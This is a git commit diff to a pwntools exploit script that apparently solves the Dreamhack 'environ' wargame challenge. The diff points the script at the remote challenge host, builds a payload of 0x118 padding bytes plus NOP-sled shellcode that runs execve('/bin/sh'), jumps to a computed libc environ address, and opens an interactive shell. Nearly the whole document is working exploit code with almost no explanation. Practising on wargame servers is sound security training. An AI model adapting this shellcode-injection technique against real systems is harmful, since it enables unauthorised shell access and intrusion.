6f97d8b2f2ddd9baa7ef304703b10e67001a97d8
Persian <kr.cs.project.59@gmail.com>
2021-07-29 14:15:52 +0900

    Thu 29 Jul 2021 02:15:52 PM KST

--- wargame/Python/dreamhack_pwnable_environ.py
+++ wargame/Python/dreamhack_pwnable_environ.py
@@ -2,8 +2,8 @@
 
 from pwn import *
 
-p = process("./environ")
-#p = remote("host1.dreamhack.games", 16110)
+#p = process("./environ")
+p = remote("host1.dreamhack.games", 13317)
 
 #context.log_level = 'debug'
 context.arch = 'x86_64'
@@ -11,6 +11,9 @@ context.arch = 'x86_64'
 shellcode = b"\x90"*50
 shellcode += asm(shellcraft.execve("/bin/sh"))
 size = len(shellcode)
+
+padding = b"A"*0x118
+size += len(padding)
 
 p.recvuntil(": ")
 stdout = int(p.recvuntil("\n").decode('utf-8').strip("\n"), 16)
@@ -23,3 +26,16 @@ log.info("Library Base Address: " + hex(libcBase))
 environOffset = 0x00000000003c6f38
 environ = libcBase + environOffset
 log.info("Environ: " + hex(environ))
+
+payload = padding
+payload += shellcode
+
+p.sendlineafter("Size: ", str(size))
+p.sendlineafter("Data: ", payload)
+p.sendlineafter("*jmp=", str(environ))
+
+p.interactive()
+
+"""
+environ in Address - buf = 0x118
+"""
